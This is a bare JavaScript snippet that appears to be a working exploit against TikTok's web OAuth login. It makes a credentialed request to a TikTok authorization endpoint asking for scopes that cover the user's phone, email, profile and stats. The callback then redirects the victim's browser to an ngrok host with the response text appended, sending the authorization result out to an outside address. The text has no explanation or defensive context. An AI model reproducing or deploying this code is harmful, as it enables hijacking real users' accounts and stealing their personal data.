var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/v2/?client_key=awn32gkr1d27lv49&scope=user.info.basic%2Cuser.info.phone%2Cuser.info.email%2Cuser.info.profile%2Cuser.info.stats%2Cuser.info.username&aid=1459&state=%7B%22csrfState%22%3A%22%22%2C%22login_only%22%3A1%2C%22page_name%22%3A%22log_in%22%2C%22redirect_url%22%3A%22https%3A%2F%2Fseller-id.tiktok.com%2Fhomepage%3Fregion_check%3D1%22%2C%22url_params%22%3A%22%22%7D&redirect_uri=https%3A%2F%2Fseller-id.tiktok.com%2Faccount%2Foauth%2Ftt%2Fcallback&source=web&response_type=code");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//b564-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
